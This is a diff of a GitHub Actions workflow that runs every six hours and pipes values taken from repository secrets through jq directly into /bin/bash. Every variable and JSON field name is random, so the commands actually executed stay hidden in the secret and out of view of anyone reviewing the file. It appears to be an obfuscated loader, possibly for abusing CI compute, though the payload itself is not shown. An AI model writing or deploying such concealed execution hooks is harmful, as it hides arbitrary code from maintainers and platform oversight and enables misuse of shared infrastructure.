@@ -1,10 +1,10 @@
 name: weishenhou9876
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '46 0/6 * * *'
-jobs:  # 6608
+    - cron: '12 5/6 * * *'
+
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,21 +12,17 @@ jobs:  # 6608
       - uses: actions/checkout@v4
       - name: weishenhou9876
         env:
-          gods907: ${{ secrets.gods907 }}
+          b174: ${{ secrets.b174 }}
         run: |
-          echo $gods907 | jq -r .ukr5 | /bin/bash
-          echo $mfcc93573 | jq -r .tdy20883 | /bin/bash
-          echo $xnh972 | jq -r .py0 | /bin/bash
-          echo $zrhw229 | jq -r .m29789 | /bin/bash
-          echo $yol64199 | jq -r .ec7210 | /bin/bash
-          echo $qa397 | jq -r .dn1 | /bin/bash
-          echo $aty9 | jq -r .yf820 | /bin/bash
-          echo $xyh936 | jq -r .vjzdx563 | /bin/bash
-          echo $lqdq27 | jq -r .ufja587 | /bin/bash
-          echo $labop4155 | jq -r .pnx34546 | /bin/bash
-          echo $yz64 | jq -r .iww84 | /bin/bash
-          echo $tlrl7012 | jq -r .d354 | /bin/bash
-          echo $qi58 | jq -r .zwbmz13643 | /bin/bash
-          echo $vorun98 | jq -r .ggia8 | /bin/bash
-          echo $nzjjp89 | jq -r .owc15 | /bin/bash
+          echo $b174 | jq -r .hign47685 | /bin/bash
+          echo $vkh500 | jq -r .yxgz6687 | /bin/bash
+          echo $nsw8 | jq -r .envri19 | /bin/bash
+          echo $t0146 | jq -r .ts1553 | /bin/bash
+          echo $bf7414 | jq -r .ou36865 | /bin/bash
+          echo $wfxnl40 | jq -r .ue54 | /bin/bash
+          echo $lqlaw5 | jq -r .k1 | /bin/bash
+          echo $rbtnv68 | jq -r .axh190 | /bin/bash
+          echo $xyzh89564 | jq -r .lz56933 | /bin/bash
+          echo $bndg8893 | jq -r .ne748 | /bin/bash
+          echo $d894 | jq -r .f40 | /bin/bash
 
